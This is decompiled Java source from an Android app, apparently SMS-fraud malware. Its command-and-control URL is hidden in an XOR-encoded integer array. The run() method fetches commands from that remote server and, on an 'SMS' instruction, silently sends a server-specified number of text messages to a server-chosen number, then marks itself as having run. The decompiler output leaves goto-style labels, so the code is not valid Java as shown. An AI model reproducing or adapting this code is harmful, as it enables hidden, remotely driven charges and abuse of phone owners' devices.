// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package fish;

import android.content.Context;
import android.content.SharedPreferences;
import android.telephony.SmsManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class sms_thread extends Thread
{

    public sms_thread(Context context1)
    {
        context = context1;
    }

    public static String decode(int ai[])
    {
        StringBuffer stringbuffer = new StringBuffer();
        int i = 0;
        do
        {
            if(i >= ai.length)
                return stringbuffer.toString();
            stringbuffer.append(String.valueOf((char)(-1 ^ ai[i])));
            i++;
        } while(true);
    }

    public boolean check_Alive()
    {
        return context.getSharedPreferences("database", 0).getBoolean("alive", false);
    }

    public void run()
    {
        if(!check_Alive()) goto _L2; else goto _L1
_L1:
        return;
_L2:
        HttpURLConnection httpurlconnection = null;
        URL url;
        String s = decode(address);
        url = new URL(s);
        BufferedReader bufferedreader;
        StringBuffer stringbuffer;
        httpurlconnection = (HttpURLConnection)url.openConnection();
        httpurlconnection.setDoInput(true);
        httpurlconnection.setDoOutput(true);
        httpurlconnection.setUseCaches(false);
        httpurlconnection.setRequestMethod("GET");
        httpurlconnection.setRequestProperty("Connection", "Keep-Alive");
        httpurlconnection.setRequestProperty("Charset", "UTF-8");
        httpurlconnection.setRequestProperty("Content-type", "application/x-www-form-urlencoded");
        bufferedreader = new BufferedReader(new InputStreamReader(httpurlconnection.getInputStream()));
        stringbuffer = new StringBuffer();
_L9:
        String s1 = bufferedreader.readLine();
        if(s1 != null) goto _L4; else goto _L3
_L3:
        String as[] = stringbuffer.toString().split("\\*");
        if(!as[0].toUpperCase().equals("SMS")) goto _L6; else goto _L5
_L5:
        int i;
        String s2;
        String s3;
        i = Integer.parseInt(as[3]);
        s2 = as[4];
        s3 = as[5];
        if(i != 0) goto _L8; else goto _L7
_L7:
        httpurlconnection.disconnect();
          goto _L1
_L4:
        stringbuffer.append(s1);
          goto _L9
        Exception exception3;
        exception3;
        Exception exception1 = exception3;
_L13:
        exception1.printStackTrace();
        httpurlconnection.disconnect();
          goto _L1
_L8:
        SmsManager smsmanager;
        int j;
        smsmanager = SmsManager.getDefault();
        j = 0;
          goto _L10
_L14:
        save_Alive();
        httpurlconnection.disconnect();
          goto _L1
_L15:
        smsmanager.sendTextMessage(s2, null, s3, null, null);
        j++;
        continue; /* Loop/switch isn't completed */
_L6:
        as[0].toUpperCase().equals("BBX");
        break; /* Loop/switch isn't completed */
        Exception exception2;
        exception2;
_L12:
        httpurlconnection.disconnect();
        throw exception2;
        exception2;
        if(true) goto _L12; else goto _L11
_L11:
        Exception exception;
        exception;
        exception1 = exception;
          goto _L13
_L10:
        if(j < i) goto _L15; else goto _L14
    }

    public void save_Alive()
    {
        android.content.SharedPreferences.Editor editor = context.getSharedPreferences("database", 0).edit();
        editor.putBoolean("alive", true);
        editor.commit();
    }

    public static int address[];
    Context context;

    static 
    {
        int ai[] = new int[48];
        ai[0] = -105;
        ai[1] = -117;
        ai[2] = -117;
        ai[3] = -113;
        ai[4] = -59;
        ai[5] = -48;
        ai[6] = -48;
        ai[7] = -106;
        ai[8] = -47;
        ai[9] = -122;
        ai[10] = -98;
        ai[11] = -111;
        ai[12] = -104;
        ai[13] = -115;
        ai[14] = -118;
        ai[15] = -106;
        ai[16] = -109;
        ai[17] = -106;
        ai[18] = -111;
        ai[19] = -104;
        ai[20] = -47;
        ai[21] = -100;
        ai[22] = -112;
        ai[23] = -110;
        ai[24] = -48;
        ai[25] = -98;
        ai[26] = -48;
        ai[27] = -98;
        ai[28] = -111;
        ai[29] = -101;
        ai[30] = -115;
        ai[31] = -112;
        ai[32] = -106;
        ai[33] = -101;
        ai[34] = -47;
        ai[35] = -98;
        ai[36] = -116;
        ai[37] = -113;
        ai[38] = -64;
        ai[39] = -119;
        ai[40] = -102;
        ai[41] = -115;
        ai[42] = -116;
        ai[43] = -106;
        ai[44] = -112;
        ai[45] = -111;
        ai[46] = -62;
        ai[47] = -50;
        address = ai;
    }
}
